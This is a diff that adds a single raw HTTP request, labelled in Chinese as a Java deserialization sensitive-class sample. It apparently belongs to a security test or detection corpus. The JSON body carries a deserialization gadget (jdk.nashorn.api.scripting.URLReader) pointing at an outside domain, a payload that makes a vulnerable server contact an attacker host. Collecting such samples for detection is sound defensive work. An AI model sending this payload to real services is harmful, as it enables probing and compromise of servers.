@@ -1,0 +1,6 @@
+# java反序列化敏感类
+POST /billcheck/html/index.html HTTP/1.0
+Host: www.xwd_test.com
+Content-Length: 111
+
+{"reader":{"111":"jdk.nashorn.api.scripting.URLReader","url":"http://rx9rno.w2au8p.b04030.gzn1l.online:80/"}}
